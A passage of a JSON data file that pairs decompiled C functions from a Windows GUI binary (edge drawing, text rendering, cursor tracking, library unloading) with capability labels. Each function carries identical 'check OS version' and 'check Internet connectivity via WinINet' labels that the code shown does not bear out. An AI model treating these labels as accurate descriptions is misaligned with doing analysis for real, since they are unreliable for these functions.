2U < 2) {\n                uVar2 = 0x2210;\n            }\n            uVar2 = fcn.0041d804(&var_19h, 4, uVar2);\n            sub.user32.dll_DrawFrameControl(uVar2);\n        }\n        else {\n            if ((*(in_EAX + 0x182) - 2U < 2) ||\n               (((*(in_EAX + 0x181) != '\\0' && (*(in_EAX + 0x182) != '\\x01')) || ((*(in_EAX + 7) & 0x10) != 0)))) {\n                uVar2 = fcn.0041d804(&var_19h, *((*(in_EAX + 0x182) - 2U < 2) * 4 + 0x4619b4), \n                                     *(*(in_EAX + 0x5e) * 4 + 0x4619bc) | 0xf);\n                sub.user32.dll_DrawEdge(uVar2);\n            }\n            else if (*(in_EAX + 0x5e) == '\\0') {\n                fcn.0041d0bc();\n                fcn.0041d460();\n            }\n            sub.user32.dll_InflateRect(&var_19h, 0xffffffff, 0xffffffff);\n        }\n        if (*(in_EAX + 0x182) - 2U < 2) {\n            if ((*(in_EAX + 0x182) == '\\x03') && ((*(in_EAX + 0x60) == '\\0' || (*(in_EAX + 0x181) == '\\0')))) {\n                fcn.00423b70();\n                fcn.0041d090();\n                fcn.0041d460();\n            }\n            var_8h = 1;\n            var_4h = 1;\n        }\n        else {\n            var_8h = 0;\n            var_4h = 0;\n        }\n        puVar9 = &var_8h;\n        fcn.0043952c();\n        uVar10 = 0;\n        uVar8 = *(in_EAX + 0x173);\n        iVar7 = in_EAX[0x5f];\n        uVar6 = in_EAX[0x5d];\n        uVar3 = uVar6 & 0xffffff00 | *(in_EAX + 0x182);\n        uVar4 = uVar6 & 0xffffff00 | *(in_EAX + 0x5e);\n        uVar2 = fcn.0043b800();\n        puVar5 = &var_38h;\n        fcn.0042ce34(puVar5, uVar2, uVar4, uVar3, uVar6, iVar7, uVar8, uVar10, puVar9);\n    }\n    else {\n        fcn.0041d804();\n        fcn.00436680();\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            var_9h = '\\x05';\n        }\n        else if (*(in_EAX + 0x182) - 2U < 2) {\n            var_9h = '\\x04';\n        }\n        else if (*(in_EAX + 0x181) == '\\0') {\n            var_9h = '\\x02';\n        }\n        else {\n            var_9h = '\\x03';\n        }\n        cVar1 = '\\0';\n        if (*(in_EAX + 0x60) != '\\0') {\n            if (var_9h == '\\x02') {\n                cVar1 = '\\x02';\n            }\n            else if (var_9h == '\\x03') {\n                cVar1 = '\\x03';\n            }\n            else if (var_9h == '\\x04') {\n                cVar1 = '\\x04';\n            }\n            else if (var_9h == '\\x05') {\n                cVar1 = '\\x05';\n            }\n        }\n        (**(*in_EAX + 0x44))();\n        if (cVar1 == '\\0') {\n            fcn.0042f140();\n            fcn.0042f484();\n            puVar5 = &var_19h;\n            uVar10 = 0;\n            uVar2 = fcn.0041d804();\n            fcn.0042f140(uVar2);\n            fcn.0042f32c(uVar10, puVar5);\n            puVar5 = &var_19h;\n            puVar9 = &var_38h;\n            uVar2 = fcn.0041d804();\n            fcn.0042f140(uVar2);\n            fcn.0042f290(puVar9, puVar5);\n            var_19h = var_38h;\n            uStack25 = uStack56;\n            uStack21 = uStack52;\n            uStack17 = uStack48;\n        }\n        else {\n            fcn.0042f140();\n            fcn.0042f544();\n            puVar5 = &var_19h;\n            uVar10 = 0;\n            uVar2 = fcn.0041d804();\n            fcn.0042f140(uVar2);\n            fcn.0042f32c(uVar10, puVar5);\n            puVar5 = &var_19h;\n            puVar9 = &var_38h;\n            uVar2 = fcn.0041d804();\n            fcn.0042f140(uVar2);\n            fcn.0042f290(puVar9, puVar5);\n            var_19h = var_38h;\n            uStack25 = uStack56;\n            uStack21 = uStack52;\n            uStack17 = uStack48;\n        }\n        if (var_9h == '\\x04') {\n            if (cVar1 != '\\0') {\n                fcn.0041c8f0();\n            }\n            fcn.00412708();\n        }\n        else {\n            fcn.00412708();\n        }\n        puVar9 = &var_8h;\n        fcn.0043952c();\n        uVar10 = 0;\n        uVar8 = *(in_EAX + 0x173);\n        iVar7 = in_EAX[0x5f];\n        uVar6 = in_EAX[0x5d];\n        uVar3 = uVar6 & 0xffffff00 | *(in_EAX + 0x182);\n        uVar4 = uVar6 & 0xffffff00 | *(in_EAX + 0x5e);\n        uVar2 = fcn.0043b800();\n        puVar5 = &var_38h;\n        fcn.0042ce34(puVar5, uVar2, uVar4, uVar3, uVar6, iVar7, uVar8, uVar10, puVar9);\n    }\n    *in_FS_OFFSET = puVar5;\n    fcn.00403fcc(0x42d4ad);\n    return;\n}\n",
        "token_count": 2081
    },
    "0042d4b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042d4b4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uchar auStack16 [8];\n    \n    if (*(in_EAX + 0x60) != '\\0') {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 != '\\0') {\n            sub.user32.dll_GetCursorPos(auStack16);\n            piVar2 = fcn.00437dd8();\n            *(in_EAX + 0x181) = in_EAX != piVar2;\n            if (in_EAX != piVar2) {\n                fcn.0043a6d4(0);\n            }\n            else {\n                fcn.0043a6d4(0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "0042d544": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0042d544(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char in_DL;\n    uint var_1h;\n    \n    fcn.0043aae8(arg_8h, arg_ch);\n    if (in_DL == '\\0') {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x5c) == '\\0') {\n                *(in_EAX + 0x182) = 2;\n                (**(*in_EAX + 0x7c))();\n            }\n            *(in_EAX + 0x171) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0042d59c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0042d59c(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    char var_2h;\n    uint var_1h;\n    \n    fcn.0043ada0(arg_8h);\n    if (*(in_EAX + 0x171) == '\\0') {\n        if (*(in_EAX + 0x181) == '\\0') {\n            fcn.0042d4b4();\n        }\n    }\n    else {\n        if (*(in_EAX + 0x5c) == '\\0') {\n            var_2h = '\\0';\n        }\n        else {\n            var_2h = '\\x03';\n        }\n        if (-1 < in_ECX) {\n            iVar1 = fcn.00438f30();\n            if ((in_ECX < iVar1) && (-1 < arg_8h)) {\n                iVar1 = fcn.00438f74();\n                if (arg_8h <= iVar1) {\n                    if (*(in_EAX + 0x5c) == '\\0') {\n                        var_2h = '\\x02';\n                    }\n                    else {\n                        var_2h = '\\x03';\n                    }\n                }\n            }\n        }\n        if (var_2h != *(in_EAX + 0x182)) {\n            *(in_EAX + 0x182) = var_2h;\n            (**(*in_EAX + 0x7c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "0042d63c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.0042d63c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint var_2h;\n    \n    fcn.0043ae48(arg_8h, arg_ch);\n    if (*(in_EAX + 0x171) != '\\0') {\n        *(in_EAX + 0x171) = 0;\n        if ((((arg_ch < 0) || (iVar2 = fcn.00438f30(),  iVar2 <= arg_ch)) || (arg_8h < 0)) ||\n           (iVar2 = fcn.00438f74(),  iVar2 < arg_8h)) {\n            bVar1 = false;\n        }\n        else {\n            bVar1 = true;\n        }\n        if (in_EAX[0x5a] == 0) {\n            *(in_EAX + 0x182) = 0;\n            *(in_EAX + 0x181) = 0;\n            if ((bVar1) && (1 < *(in_EAX + 0x182) - 2U)) {\n                (**(*in_EAX + 0x7c))();\n            }\n        }\n        else if (bVar1) {\n            fcn.0042d7f4();\n            if (*(in_EAX + 0x5c) != '\\0') {\n                (**(*in_EAX + 0x80))();\n            }\n        }\n        else {\n            if (*(in_EAX + 0x5c) != '\\0') {\n                *(in_EAX + 0x182) = 3;\n            }\n            (**(*in_EAX + 0x80))();\n        }\n        if (bVar1) {\n            fcn.00403454();\n        }\n        fcn.0042d4b4();\n        return;\n    }\n    return;\n}\n",
        "token_count": 443
    },
    "0042d7bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042d7bc(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x168) != 0) && (*(in_EAX + 0x30) != 0)) {\n        fcn.0043ca58(0xb018, *(in_EAX + 0x168));\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0042d7f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d7f4(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x5a] == 0) {\n        param_2 = '\\0';\n    }\n    if ((param_2 != *(in_EAX + 0x5c)) && ((*(in_EAX + 0x5c) == '\\0' || (*(in_EAX + 0x172) != '\\0')))) {\n        *(in_EAX + 0x5c) = param_2;\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x182) = 0;\n            (**(*in_EAX + 0x80))();\n        }\n        else {\n            if (*(in_EAX + 0x182) == '\\0') {\n                (**(*in_EAX + 0x7c))();\n            }\n            *(in_EAX + 0x182) = 3;\n        }\n        if (param_2 != '\\0') {\n            fcn.0042d7bc();\n        }\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "0042da00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042da00(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x42da89;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.0043952c();\n    cVar1 = fcn.00450650();\n    if (cVar1 != '\\0') {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if ((((cVar1 != '\\0') && (*(in_EAX + 0x57) != '\\0')) && (in_EAX[0xc] != 0)) && (*(in_EAX[0xc] + 0x1a6) != '\\0'))\n        {\n            fcn.00403454();\n            *(param_2 + 0xc) = 1;\n            goto code_r0x0042da73;\n        }\n    }\n    (**(*in_EAX + -0x10))();\ncode_r0x0042da73:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x42da90;\n    uStack24 = 0x42da88;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 335
    },
    "0042dc38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dc38(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    fcn.0043b3f4();\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        if ((param_1 != '\\0') || (*(in_EAX + 0x168) == 0)) {\n            fcn.0042d880();\n        }\n        piVar2 = fcn.0042d758();\n        cVar1 = (**(*piVar2 + 0x1c))();\n        if ((((cVar1 != '\\0') && (*(param_2 + 0x5c) != 0)) && (*(*(param_2 + 0x5c) + 0x38) != 0)) &&\n           (-1 < *(param_2 + 0x80))) {\n            iVar3 = fcn.00446b64();\n            if (*(param_2 + 0x80) < iVar3) {\n                fcn.0042dba8(&stack0xfffffffc);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "0042ecb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042ecb0(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42ecf5;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x463ac8 = *0x463ac8 + 1;\n    if (*0x463ac8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4619dc != 0) {\n            iStack20 = *0x4619dc;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00403fa8();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 226
    },
    "0042ed08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042ed08(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42ed4c;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x463acc = *0x463acc + 1;\n    if (((*0x463acc == 0) && (*0x463ad4 != '\\0')) && (*0x463ad0 != 0)) {\n        iStack20 = *0x463ad0;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 185
    },
    "0042ee38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0042ee38(void)\n\n{\n    if (*0x463ae8 == 0) {\n        *0x463ae8 = fcn.0040bd88();\n    }\n    return *0x463ae8;\n}\n",
        "token_count": 55
    },
    "0042ee98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042ee98(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42ef07;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x463adc = *0x463adc + 1;\n    if (*0x463adc == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x463ae0 != 0) {\n            iStack20 = *0x463ae0;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x463ae4 != 0) {\n            sub.kernel32.dll_FreeLibrary_1(*0x463ae4);\n        }\n        fcn.004049e4();\n        fcn.004049e4();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 261
    },
    "0042f140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0042f140(void)\n\n{\n    if (*0x463af0 == 0) {\n        *0x463af0 = (**(*0x4619f8 + 4))();\n    }\n    return *0x463af0;\n}\n",
        "token_count": 60
    },
    "0042f1e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042f1e0(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 6) != '\\0') && (*(in_EAX + 8 + (param_2 & 0xff) * 4) == 0)) {\n        uVar1 = (***0x461ef0)(0, *((param_2 & 0x7f) * 4 + 0x461a00));\n        *(in_EAX + 8 + (param_2 & 0x7f) * 4) = uVar1;\n    }\n    return *(in_EAX + 8 + (param_2 & 0xff) * 4);\n}\n",
        "token_count": 175
    },
    "0042f220": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0042f220(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 5) != '\\0') && (*(in_EAX + 6) != '\\0')) && (*(in_EAX + 4) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "0042f3b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f3b8(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == '\\0') || (arg_10h == 0)) {\n        cVar1 = '\\x01';\n    }\n    else {\n        uVar2 = fcn.0042f1e0(*(arg_10h + 4), *(arg_10h + 8));\n        iVar3 = (***0x461edc)(uVar2);\n        cVar1 = '\\x01' - (iVar3 == 0);\n    }\n    if (cVar1 != '\\0') {\n        (***0x462070)(in_EDX, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "0042fad8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042fad8(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 6) != '\\0') {\n        fcn.0042f24c();\n    }\n    uVar1 = fcn.00426790();\n    *(in_EAX + 6) = uVar1;\n    return;\n}\n",
        "token_count": 84
    },
    "00431d34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2dh\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_3dh\n// WARNING: Variable defined which should be unmapped: var_39h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00431d34(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    uchar extraout_var;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint32_t uStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint *puStackY76;\n    uint32_t uStackY72;\n    uchar auStack68 [3];\n    uint var_3dh;\n    uint var_39h;\n    uchar uStack57;\n    uint arg_ch;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    int32_t var_21h;\n    uint var_1dh;\n    uint32_t var_19h;\n    uint var_15h;\n    uint uStack21;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1dh._1_1_ = 0xfc;\n    *0x4 = 0x11;\n    do {\n        var_4h = 0;\n        *0x4 = *0x4 + -1;\n    } while (*0x4 != 0);\n    var_dh._0_1_ = unaff_EBX >> 0x18;\n    uStack21._0_1_ = unaff_ESI >> 0x18;\n    uStack21 = CONCAT31(unaff_EBX, uStack21);\n    var_15h._0_1_ = unaff_EDI >> 0x18;\n    var_15h = CONCAT31(unaff_ESI, var_15h);\n    var_1dh._2_2_ = &stack0xfffffffc >> 8;\n    var_19h._0_1_ = &stack0xfffffffc >> 0x18;\n    var_19h = CONCAT31(unaff_EDI, var_19h);\n    var_1dh._0_1_ = 0;\n    uVar3 = *in_FS_OFFSET;\n    var_25h._1_1_ = uVar3;\n    var_25h._2_2_ = uVar3 >> 8;\n    var_21h._0_1_ = uVar3 >> 0x18;\n    var_21h = CONCAT31(0x4320d6, var_21h);\n    *in_FS_OFFSET = &fcn.00431d34::var_25h + 1;\n    var_29h._1_1_ = 0x67;\n    var_29h._2_2_ = 0x431d;\n    var_25h._0_1_ = 0;\n    fcn.0041d724();\n    var_29h._1_1_ = 0x6c;\n    var_29h._2_2_ = 0x431d;\n    var_25h._0_1_ = 0;\n    fcn.0042f140();\n    var_29h._1_1_ = 0x71;\n    var_29h._2_2_ = 0x431d;\n    var_25h._0_1_ = 0;\n    cVar2 = fcn.0042f220();\n    if (cVar2 == '\\0') {\n        var_29h._1_1_ = 1;\n        var_29h._2_2_ = 0x431f;\n        var_25h._0_1_ = 0;\n        var_4h = fcn.0041d680();\n        iVar1 = in_EAX[0x13];\n        var_29h._1_1_ = iVar1;\n        var_29h._2_2_ = iVar1 >> 8;\n        var_25h._0_1_ = iVar1 >> 0x18;\n        var_2dh._1_1_ = SUB41(&fcn.00431d34::var_1dh, 0);\n        var_2dh._2_2_ = &fcn.00431d34::var_1dh >> 8;\n        var_29h._0_1_ = &fcn.00431d34::var_1dh >> 0x18;\n        var_2dh._0_1_ = 0;\n        fcn.00412730(&fcn.00431d34::var_1dh, iVar1);\n        if (*(in_EAX + 0x1a5) == '\\0') {\n            var_2dh._0_1_ = 0;\n            fcn.0041d0bc();\n        }\n        else {\n            iVar1 = CONCAT22(var_1dh._2_2_, CONCAT11(var_1dh._1_1_, var_1dh)) + 1;\n            var_1dh._0_1_ = iVar1;\n            var_1dh._1_1_ = iVar1 >> 8;\n            var_1dh._2_2_ = iVar1 >> 0x10;\n            var_19h = var_19h + 1;\n            var_2dh._0_1_ = 0;\n            fcn.0041d0bc();\n            var_2dh._0_1_ = 0;\n            fcn.0041d49c();\n            var_2dh._0_1_ = 0xff;\n            var_39h._1_1_ = SUB41(&fcn.00431d34::var_1dh, 0);\n            var_39h._2_2_ = &fcn.00431d34::var_1dh >> 8;\n            uStack57 = &fcn.00431d34::var_1dh >> 0x18;\n            var_3dh._1_1_ = 0x54;\n            var_3dh._2_2_ = 0x431f;\n            var_39h._0_1_ = 0;\n            sub.user32.dll_OffsetRect();\n            var_3dh._1_1_ = 0x61;\n            var_3dh._2_2_ = 0x431f;\n            var_39h._0_1_ = 0;\n            fcn.0041d0bc();\n        }\n        var_3dh._1_1_ = 0x7a;\n        var_3dh._2_2_ = 0x431f;\n        var_39h._0_1_ = 0;\n        fcn.0041d49c();\n        var_3dh._1_1_ = 0x84;\n        var_3dh._2_2_ = 0x431f;\n        var_39h._0_1_ = 0;\n        fcn.0043952c();\n        if (var_68h != 0) {\n            var_3dh._1_1_ = 0x99;\n            var_3dh._2_2_ = 0x431f;\n            var_39h._0_1_ = 0;\n            cVar2 = fcn.00403454();\n            var_3dh._1_1_ = var_4h;\n            var_39h._0_1_ = var_4h >> 0x18;\n            var_3dh._2_2_ = var_4h >> 8;\n            if (cVar2 == '\\0') {\n                _auStack68 = &fcn.00431d34::var_1dh;\n                uStackY72 = 0x431fb3;\n                fcn.00412730(_auStack68, var_4h);\n            }\n            else {\n                _auStack68 = &fcn.00431d34::var_78h;\n                uStackY72 = 0x431fc7;\n                fcn.0043952c();\n                uStackY72 = 0x431fd5;\n                fcn.0041d664();\n                uStackY72 = 0x431fe8;\n                fcn.00412730(_auStack68, CONCAT13(var_39h, CONCAT21(var_3dh._2_2_, var_3dh._1_1_)));\n                var_1dh._0_1_ = var_78h;\n                var_1dh._1_1_ = var_78h >> 8;\n                var_1dh._2_2_ = var_78h >> 0x10;\n                var_19h = uStackY120;\n                var_15h = uStackY116;\n                uStack21 = uStackY112;\n            }\n            uStackY72 = 0x432000;\n            uVar4 = fcn.0043b800();\n            uStackY72 = uVar4 | 0x400;\n            puStackY76 = &fcn.00431d34::var_1dh;\n            var_4ch = 0x432018;\n            fcn.0043952c();\n            var_4ch = 0x432020;\n            var_4ch = fcn.00404268();\n            var_50h = 0x43202e;\n            fcn.0043952c();\n            var_50h = 0x432039;\n            var_50h = fcn.00404468();\n            var_54h = 0x432041;\n            var_54h = fcn.0041d804();\n            var_58h = 0x432047;\n            sub.user32.dll_DrawTextA();\n            var_58h = 0x432052;\n            fcn.0041d0bc();\n            var_5ch = &fcn.00431d34::var_1dh;\n            var_60h = 0x432064;\n            var_58h = uVar4;\n            fcn.0043952c();\n            var_60h = 0x43206f;\n            var_60h = fcn.00404268();\n            var_64h = 0x43207d;\n            fcn.0043952c();\n            var_64h = 0x432088;\n            var_64h = fcn.00404468();\n            var_68h = 0x432090;\n            var_68h = fcn.0041d804();\n            uStackY112 = 0x432096;\n            sub.user32.dll_DrawTextA();\n        }\n    }\n    else {\n        var_29h._1_1_ = 0x83;\n        var_29h._2_2_ = 0x431d;\n        var_25h._0_1_ = 0;\n        fcn.0043952c();\n        if (var_50h == 0) {\n            var_29h._1_1_ = 0;\n            var_29h._2_2_ = 0;\n            var_25h._0_1_ = 0;\n            var_2dh._1_1_ = SUB41(&fcn.00431d34::var_2dh, 0);\n            var_2dh._2_2_ = &fcn.00431d34::var_2dh >> 8;\n            var_29h._0_1_ = &fcn.00431d34::var_2dh >> 0x18;\n            var_2dh._0_1_ = 0;\n            fcn.00412730(&fcn.00431d34::var_2dh, 0);\n        }\n        else {\n            iVar1 = &fcn.00431d34::var_dh + 1;\n            var_29h._1_1_ = iVar1;\n            var_29h._2_2_ = iVar1 >> 8;\n            var_25h._0_1_ = iVar1 >> 0x18;\n            var_2dh._1_1_ = 0x9b;\n            var_2dh._2_2_ = 0x431d;\n            var_29h._0_1_ = 0;\n            fcn.0043952c();\n            var_2dh._1_1_ = 0xa3;\n            var_2dh._2_2_ = 0x431d;\n            var_29h._0_1_ = 0;\n            uVar3 = fcn.00404268();\n            var_2dh._1_1_ = uVar3;\n            var_2dh._2_2_ = uVar3 >> 8;\n            var_29h._0_1_ = uVar3 >> 0x18;\n            var_2dh._0_1_ = 0;\n            fcn.0043952c();\n            var_2dh._0_1_ = 0;\n            fcn.00404468();\n            var_2dh._0_1_ = extraout_var;\n            fcn.0041d804();\n            var_39h._1_1_ = 0xc4;\n            var_39h._2_2_ = 0x431d;\n            uStack57 = 0;\n            sub.gdi32.dll_GetTextExtentPoint32A();\n            